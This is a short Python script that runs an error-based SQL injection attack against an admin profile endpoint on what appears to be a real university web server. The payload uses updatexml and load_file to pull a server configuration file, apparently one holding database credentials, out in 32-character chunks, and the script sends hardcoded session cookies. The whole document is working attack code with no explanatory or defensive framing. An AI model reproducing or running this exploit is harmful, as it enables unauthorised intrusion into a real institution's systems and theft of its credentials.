import requests

payload = '''1 and updatexml(1,concAt#;
(0x7e,substr(load_file#;
('/var/www/html/apply/Application/Admin/Conf/config.php'),{0},{1}),0x7e),1);#'''

header = {
    'Cookie':'uid=2nup8talg7j9i6j4dai9d4e903; auth_id=gsbv4llnqvrsssdi88ajktnq26',
    'X-Requested-With': 'XMLHttpRequest'
}

url = 'http://huodongshenpi.scu.edu.cn/index.php/Admin/Admin/profile'

for i in range(0,32):

    data = {
        'id[0]':'bind',
        'account':'水利水电学院A',
        'id_number':'',
        'phone':'',
        'password':'123456789',
        'id[1]':payload.format(i*32+1,32)
    }

    res = requests.post(headers=header,data=data,url=url)
